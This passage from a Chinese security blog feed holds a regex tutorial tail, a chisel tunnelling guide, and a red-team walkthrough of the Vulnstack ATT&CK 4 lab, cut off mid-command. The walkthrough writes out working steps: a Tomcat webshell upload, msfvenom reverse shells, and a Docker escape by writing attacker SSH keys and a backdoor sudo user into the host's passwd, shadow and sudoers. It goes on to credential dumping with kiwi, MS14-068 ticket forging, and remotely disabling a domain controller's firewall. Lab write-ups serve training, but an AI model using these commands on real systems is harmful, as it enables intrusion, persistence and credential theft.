&#x27;102300&#x27;).groups()</span><br><span class="line">(&#x27;102300&#x27;, &#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>由于<code>\d+</code>采用贪婪匹配，直接把后面的0全部匹配了，结果<code>0*</code>只能匹配空字符串了。</p><p>必须让<code>\d+</code>采用非贪婪匹配（也就是尽可能少匹配），才能把后面的0匹配出来，加个<code>?</code>就可以让<code>\d+</code>采用非贪婪匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(r&#x27;^(\d+?)(0*)$&#x27;, &#x27;102300&#x27;).groups()</span><br><span class="line">(&#x27;1023&#x27;, &#x27;00&#x27;)</span><br></pre></td></tr></table></figure><h2 id="0x06-写在最后"><a href="#0x06-写在最后" class="headerlink" title="0x06 写在最后"></a>0x06 写在最后</h2><p>正则表达式的内容绝不止这些，这些只是基本的用法。<br>后面会接着学习。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-基础&quot;&gt;&lt;a href=&quot;#0x00-基础&quot; class=&quot;headerlink&quot; title=&quot;0x00 基础&quot;&gt;&lt;/a&gt;0x00 基础&lt;/h2&gt;&lt;p&gt;正则表达式是一种用来匹配字符串的强有力的武器。它的设计思想是用一种描述性的语言来给字符串定义一个规则</summary>
      
    
    
    
    <category term="Python" scheme="http://lvpsectime.github.io/categories/Python/"/>
    
    
    <category term="python" scheme="http://lvpsectime.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>chisel使用</title>
    <link href="http://lvpsectime.github.io/post/13593.html"/>
    <id>http://lvpsectime.github.io/post/13593.html</id>
    <published>2020-05-17T03:39:38.000Z</published>
    <updated>2020-05-17T09:23:07.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在练习靶场的时候了解到了这个工具，感觉挺好用的，所以就学习一下。</p><p>项目地址：<a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p><p><strong>Chisel 是一款Go语言编写开源的通信加密的用于绕过防火墙使用 HTTP? 协议进行传输的快速 TCP 隧道工具</strong></p><p>特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- 使用方便</span><br><span class="line">- 高性能</span><br><span class="line">- 使用SSH协议的加密连接（通过crypto/ssh）</span><br><span class="line">- 支持身份验证</span><br><span class="line">- 客户端自动重新连接</span><br><span class="line">- 客户端可以通过一个 TCP 连接创建多个隧道</span><br><span class="line">- 客户端可以创建 HTTP CONNECT 代理</span><br><span class="line">- 服务端可选择兼作反向代理</span><br><span class="line">- 服务端可选择创建 SOCKS5 代理</span><br><span class="line">- 支持反向端口转发</span><br></pre></td></tr></table></figure><p>关键是<code>Chisel</code>的服务器端和客户端集成在一块，这就很方便了，不想<code>frp</code>还需要配置。</p><p>但是，<code>Chisel</code>的缺点就是，它的文件比较大。</p><h2 id="使用-Chisel-反弹-Socks5-代理"><a href="#使用-Chisel-反弹-Socks5-代理" class="headerlink" title="使用 Chisel 反弹 Socks5 代理"></a>使用 Chisel 反弹 Socks5 代理</h2><p><strong>公网主机上启动 chisel server</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 5555 --socks5  # 在本地 5555 端口启动 Socks5 服务</span><br></pre></td></tr></table></figure><p><strong>本地执行 chisel client</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel client IP:5555 socks</span><br></pre></td></tr></table></figure><h2 id="Chisel-进行端口映射"><a href="#Chisel-进行端口映射" class="headerlink" title="Chisel 进行端口映射"></a>Chisel 进行端口映射</h2><p><strong>公网主机上启动 chisel server</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 1337 --reverse</span><br></pre></td></tr></table></figure><p><strong>内网主机上启动 chisel client</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chisel client WANIP:1337 R:1234:LANIP:3389</span><br><span class="line">WANIP 是公网主机的公网 IP，LANIP 是内网主机的内网 IP</span><br></pre></td></tr></table></figure><p>如果 <code>server1</code> 上启动 <code>Chisel</code> 的 <code>client</code> 模式，且 <code>LANIP</code> 为 <code>server1</code> 的 <code>IP</code> 时，<code>server1</code> 的 <code>3389</code> 端口映射到了公网主机的 <code>1234</code> 端口</p><p><img src="https://xaaxblog.s3.amazonaws.com/2019-04-17-143105.jpg" alt="img"></p><p>如果 <code>server1</code> 上运行 <code>Chisel</code> 的 <code>client</code> 模式，但 <code>LANIP</code> 为 <code>server2</code> 的 <code>IP</code> 时，通过 <code>server1</code> 把<code>server2 </code>的 <code>3389</code> 端口映射到了公网主机的 <code>1234</code>端口</p><p><img src="https://xaaxblog.s3.amazonaws.com/2019-04-17-151947.jpg" alt="img"></p><p>从第二种用法可以看出 Chisel 的端口转发功能比 lcx 更强大</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html">Tunneling with Chisel and SSF</a></p><p><a href="https://runsisi.com/2019-09-21/chisel-proxy">https://runsisi.com/2019-09-21/chisel-proxy</a></p><p><a href="https://runsisi.com/2019-09-20/chisel-reverse-proxy">https://runsisi.com/2019-09-20/chisel-reverse-proxy</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在练习靶场的时候了解到了这个工具，感觉挺好用的，所以就学习一下。&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github</summary>
      
    
    
    
    <category term="Tools" scheme="http://lvpsectime.github.io/categories/Tools/"/>
    
    
    <category term="Tools" scheme="http://lvpsectime.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK实战系列四</title>
    <link href="http://lvpsectime.github.io/post/50306.html"/>
    <id>http://lvpsectime.github.io/post/50306.html</id>
    <published>2020-05-16T08:17:49.000Z</published>
    <updated>2020-05-16T08:31:43.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;CK实战系列——红队评估（四）靶场环境，下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>网络拓扑如下：</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-2.png" alt="ATT-CK-2.png"></p><p>IP如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali linux  192.168.150.141</span><br><span class="line">web(ubuntu) 192.168.150.160(外) 192.168.183.128(内)</span><br><span class="line">win7        192.168.183.129</span><br><span class="line">DC(win2008) 192.168.183.130</span><br></pre></td></tr></table></figure><p>进入<code>WEB</code>主机，需要手动使用<code>docker</code>开启服务，分别是<code>strtus2-045</code>、<code>cve-2017-12615</code>、<code>cve-2018-12613</code><br>使用<code>docker</code>需要使用<code>sudo</code>否则没有权限使用，开启后情况如下</p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><p>我们先用<code>nmap</code>扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oA nmap/vulnstack4 192.168.150.160</span><br></pre></td></tr></table></figure><p>扫描结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/nmap# nmap -sC -sV -oA nmap/vulnstack4 192.168.150.160</span><br><span class="line">Failed to open normal output file nmap/vulnstack4.nmap for writing</span><br><span class="line">QUITTING!</span><br><span class="line">root@kali:~/nmap# cd ..</span><br><span class="line">root@kali:~# nmap -sC -sV -oA nmap/vulnstack4 192.168.150.160</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 09:40 CST</span><br><span class="line">Nmap scan report for 192.168.150.160</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 6d:1e:e7:55:ee:d7:2b:22:d7:6b:68:67:df:39:f5:7b (DSA)</span><br><span class="line">|   2048 5e:ca:2c:70:8f:a2:0c:bf:10:d7:26:2b:15:5f:3f:58 (RSA)</span><br><span class="line">|   256 de:b5:6a:a8:24:6a:13:45:cc:87:21:c3:c2:ee:b2:10 (ECDSA)</span><br><span class="line">|_  256 8e:02:ca:99:6e:c2:eb:8f:0c:5c:bb:c9:b2:f5:06:4d (ED25519)</span><br><span class="line">2002/tcp open  http    Apache Tomcat 8.5.19</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-title: Apache Tomcat/8.5.19</span><br><span class="line">MAC Address: 00:0C:29:57:73:39 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问<code>http://192.168.150.160:2002/</code>发现是<code>Tomcat</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-1006440fbf2833079.png" alt="Tomcat"></p><p>利用<code>CVE-2017-12615</code>直接<code>put</code>一个冰蝎马上去</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/attck4-3.png" alt="attck4-3.png"></p><p>这里有几点需要<strong>注意</strong>的：</p><ol><li>将<code>GET</code>请求改为<code>PUT</code></li><li>上传<code>shell</code>的名称后面需要加上<code>/</code>，比如，<code>/shell.jsp/</code></li><li>在最后加上要上传的内容，即shell</li></ol><p>访问<code>http://192.168.150.160:2002/shell.jsp</code>，<code>shell</code>已经成功上传</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/attck4-4.png" alt="attck4-4.png"></p><p>使用冰蝎成功连接，是<code>root</code>权限</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/attck45.png" alt="attck45.png"></p><h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h3><p>首先搜索一下<code>apache tomcat</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit apache tomcat</span><br><span class="line">-------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                              |  Path</span><br><span class="line">                                                                                            | (/usr/share/exploitdb/)</span><br><span class="line">-------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">AWStats 6.x - Apache Tomcat Configuration File Arbitrary Command Execution                  | exploits/cgi/webapps/35035.txt</span><br><span class="line">Apache 1.3.x + Tomcat 4.0.x/4.1.x mod_jk - Chunked Encoding Denial of Service               | exploits/unix/dos/22068.pl</span><br><span class="line">Apache Commons FileUpload and Apache Tomcat - Denial of Service                             | exploits/multiple/dos/31615.rb</span><br><span class="line">Apache Tomcat (Windows) - &#x27;runtime.getRuntime().exec()&#x27; Local Privilege Escalation          | exploits/windows/local/7264.txt</span><br><span class="line">......</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - &#x27;utf8&#x27; Directory Traversal                                         | exploits/unix/remote/14489.c</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - &#x27;utf8&#x27; Directory Traversal (PoC)                                   | exploits/multiple/remote/6229.txt</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote C | exploits/jsp/webapps/42966.py</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote C | exploits/windows/webapps/42953.txt</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck47.png" alt="attck47.png"></p><p>找到一个可用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote C | exploits/jsp/webapps/42966.py</span><br></pre></td></tr></table></figure><p>将payload复制到当前目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit -m exploits/jsp/webapps/42966.py</span><br><span class="line">  Exploit: Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/42966</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/jsp/webapps/42966.py</span><br><span class="line">File Type: Python script, ASCII text executable, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: /root/42966.py</span><br></pre></td></tr></table></figure><p>然后可以使用<code>42966.py</code>脚本</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck48.png" alt="attck48.png"></p><p>用<code>-u</code>参数检测是否存在漏洞</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck49.png" alt="attck49.png"></p><p>存在漏洞，访问<code>http://192.168.150.160:2002/Poc.jsp</code>看一下</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck410.png" alt="attck410.png"></p><p>我们就用自带的工具利用漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http://192.168.150.160:2002/ -p pwn</span><br></pre></td></tr></table></figure><p>!<img src="http://www.sectime.top:8888/images/2020/05/15/attck411.png" alt="attck411.png"></p><p>可看到成功了，并返回一个shell</p><p>然后我们去访问上传的<code>pwn.jsp</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck412.png" alt="attck412.png"></p><p>在输入框中可执行命令</p><h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>参考：<a href="https://daolgts.github.io/2019/10/07/docker%E5%AE%89%E5%85%A8/">docker安全</a></p><p>使用<code>cve-2019-5736</code>实现<code>docker</code>逃逸  <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">EXP</a></p><p>下载后编辑<code>main.go</code>，将命令改为如下反弹<code>shell</code>命令</p><p>6</p><p>使用<code>go</code>语言编译，得到<code>main</code>文件</p><p>通过冰蝎上传<code>main</code>文件，一执行就卡死，于是反弹<code>shell</code>到<code>kali</code><br>使用冰蝎反弹<code>shell</code>到<code>msf</code>，反弹<code>meterpreter</code>发现进不了<code>shell</code>也无法执行文件，直接反弹<code>shell</code>不能接收</p><p>于是使用另外的方式反弹<code>shell</code>，首先使用<code>msf</code>生成一个反弹<code>shell</code>的后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.150.141 LPORT=5555 -f raw &gt; shell1.jsp</span><br></pre></td></tr></table></figure><p>然后将它通过冰蝎上传到网站根目录<code>/usr/local/tomcat/webapps/ROOT/</code>，执行成功反弹<code>shell</code>，然后运行<code>main</code></p><p>输入框中执行<code>ls /dev</code>，可以看到docker虚拟的硬盘</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck413.png" alt="attck412.png"></p><p>我们试一下挂载</p><p>在根目录创建一个<code>test</code>文件夹，<code>mkdir /test</code></p><p><code>mount /dev/sda1 /test</code>，看一下是否挂载成功，<code>ls /test</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck414.png"></p><p>挂载成功</p><p>我们查看一下<code>/home</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck415.png"></p><p>查看隐藏文件，<code>ls -lah /test/home/ubuntu</code>，可以看到<code>.ssh</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck416.png"></p><p>查看<code>.ssh</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck417.png"></p><p>接下来我们就利用ssh实现docker逃逸</p><p><code>ssh-keygen -f kali</code>生成私钥</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck418.png"></p><p><code>chmod 600 kali</code>，不然用不了</p><p>这里我们写一个<code>test.sh</code>脚本，方便执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">echo &gt; /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl13XtnQ/CEiD7SZLBXR8sbpEb7aXb3CMMpCZabybfg1eXitxiT+V7ypF1v8yjlRVGk7LqVeCD1nGI5d/VaDSW3fqe6fxZBH+8nAuuWbt6oEdkndaDuPgSHBZSkGJDQsePq9WOQ1tNUx7v2Jg7pMuIdd9kTQOVgK4xL2KGxddTwmpJCkv1gNn6Vd99ASWLIRKPNYdLvQ4lGAn6gPz39LBfDXaU8ri93HA75IIzz+7nXETfkx6x82vr0GuEmJBmqRRHxAQo8zAl3XC+X/tkPrSCr4OH26Rt3dQ9EL+eJJI8hSpWxGfC2uvauFQ8Brx+SuSnUAO9RevbAUyQDXyuI8LXu3vJL2Grw2tb9FDsIAEHtHUZ8o4od6xhyWThiv2hrL8nKHXzpuypTZ6WCznP6inYaCOFpChtU01kHptmzBreNy33HveKxMjKd5338dB4zSaIaaNqPKizjoejk7oRBJkuGyqecrwL3ReToj+FM02QnjK1kESpEspMTuOF5m6vwL0= kali@kali&#x27; &gt; /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">cat /test/home/ubuntu/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>保存，开启一个http服务，在目标下载</p><p><code>python -m SimpleHTTPServer</code></p><p>在输入框下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.150.141:8000/test.sh</span><br></pre></td></tr></table></figure><p><code>chmod 777 test.sh</code> ，<code>ls -la</code>看一下</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck419.png"></p><p>执行<code>test.sh</code>，<code>bash test.sh</code>，成功</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck420.png"></p><p>在<code>kali</code>上用<code>ssh</code>连接一下，并没有什么用，因为我们不知道密码。。。。</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck421.png"></p><p>那么我们该怎么办呢？可以添加用户，但不能在输入框中添加，否则添加用户到了<code>docker</code></p><p>这里我们可以修改配置文件也可以添加用户</p><p>写个脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /test/etc/passwd</span><br><span class="line">chmod 777 /test/etc/shadow</span><br><span class="line">chmod 777 /test/etc/sudoers</span><br><span class="line">mkdir /test/home/kali</span><br><span class="line">chmod 777 /test/home/kali</span><br><span class="line">echo &#x27;kali:x:1001:1000:kali,,,:/home/kali:/bin/bash&#x27; &gt;&gt; /test/etc/passwd</span><br><span class="line">echo &#x27;kali:$6$dZhS1PQKuhRB3dMq$GVQsHMiD7221rqrnfxGxP6X9Pn271DJ2N299OHzWPoR6SmSQnk7mSK96BP9ZETvqkfFs1HFbMWkxD9kCSX10H1:18397:0:99999:7:::&#x27; &gt;&gt; /test/etc/shadow</span><br><span class="line">echo &#x27;kali  ALL=(ALL:ALL)  ALL&#x27; &gt;&gt; /test/etc/sudoers</span><br><span class="line">cat /test/etc/shadow</span><br></pre></td></tr></table></figure><p>输入框下载，<code>chomd 777 adduser.sh</code>，执行<code>bash adduser.sh</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck422.png"></p><p>在<code>kali</code>上登录</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck423.png"></p><p>这里需要注意几点：</p><ol><li><code>ssh -i kali ubuntu@192.168.150.160</code>必须在<code>kali</code>上的<code>kali</code>用户下执行</li><li><code>sudoers</code>文件的权限只能是只读，上面我们改成<code>777</code>，需要把它改成<code>440</code></li><li><code>sudo -s</code>提升权限到<code>root</code></li></ol><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>利用<code>chisel</code>搭建代理</p><p><a href="https://xax007.github.io/2019/04/12/pivoting-with-chisel.html">https://xax007.github.io/2019/04/12/pivoting-with-chisel.html</a></p><p>目标机器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ./chisel server -p 9001 --socks5</span><br></pre></td></tr></table></figure><p>kali</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ./chisel client 192.168.150.160:9001 socks</span><br></pre></td></tr></table></figure><p>上大杀器<code>metasploit</code>，利用<code>ms17-010</code>，返回<code>meterpreter</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck443.png" alt="attck443.png"></p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>getuid</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p><code>ps </code>查看应用创建的服务</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck424.png" alt="attck424.png"></p><p>输入<code>shell</code>，进入系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2108 created.</span><br><span class="line">Channel 1 created.</span><br></pre></td></tr></table></figure><p><code>net view</code>，存在<code>demo</code>域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net view /domain</span><br><span class="line">net view /domain</span><br><span class="line">Domain</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">DEMO                 </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p><code>net view /domain:demo</code>查看域内机器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net view /domain:demo</span><br><span class="line">net view /domain:demo</span><br><span class="line">Server Name            Remark</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">\\TESTWIN7-PC   </span><br><span class="line">\\WIN-ENS2VR5TR3N                                                              </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p><code>net group &quot;domain ontrollers&quot; /domain</code>查看域控</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck425.png" alt="attck425.png"></p><p>出现这种情况，首先<code>exit</code>退出shell，然后<code>steal_token 进程号</code> ，再<code>shell</code>进入</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck426.png" alt="attck426.png"></p><p>域控：\\WIN-ENS2VR5TR3N </p><p><code>wmic computersystem get domain</code>查看完整域名</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck427.png" alt="attck427.png"></p><p><code>net group &quot;domain admins&quot; /domain</code>查看域内管理员</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck428.png" alt="attck428.png"></p><p><code>net group &quot;domain users&quot; /domain</code> 查看域内用户</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck429.png" alt="attck429.png"></p><p><code>nslookup \\WIN-ENS2VR5TR3N  </code> 查看域控IP</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck430.png" alt="attck430.png"></p><p><code>whoami /all</code>获取用户<code>SID</code>: <code>S-1-5-21-979886063-1111900045-1414766810-1107</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck431.png" alt="attck431.png"></p><p>域的<code>SID</code>，用户<code>SID</code>去掉最后的<code>-</code>及其后面的，即<code>S-1-5-21-979886063-1111900045-1414766810</code></p><p>信息收集到这就差不多了，当然越详细越好。</p><p><strong>抓密码</strong></p><p><code>rev2self</code>提升权限，调用<code>kiwi</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck432.png" alt="attck432.png"></p><p><code>creds_all</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck433.png" alt="attck433.png"></p><p><strong>注意：</strong> 因为登录过域成员，所以密码是明文</p><p>如果没有登录过，可以用上面的<code>NTLM hash</code></p><p><code>systeminfo</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck434.png" alt="attck434.png"></p><p>我们可以利用<code>mss14-068</code>，搜索其补丁号，若没有打补丁，说明漏洞存在</p><p>这个靶场做的很贴心，里面有很多工具，若没有，我们可以自己上传</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck435.png" alt="attck435.png"></p><p>开搞！！！</p><p>假如我们想查看域控的C盘根目录<code>dir \\WIN-ENS2VR5TR3N\c$</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck436.png" alt="attck436.png"></p><p>发现不行，我们要使用<code>MS17-068</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u douser@demo.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck437.png" alt="attck437.png"></p><p>生成了一个票据，用<code>mimikatz</code>导入</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck438.png" alt="attck438.png"></p><p>再次执行<code>dir \\WIN-ENS2VR5TR3N\c$</code>，成功</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck439.png" alt="attck439.png"></p><p>远程执行命令</p><p>创建关闭防火墙的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create ProtectFirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck440.png" alt="attck440.png"></p><p>制作反弹shell木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6001 -f exe-service -o 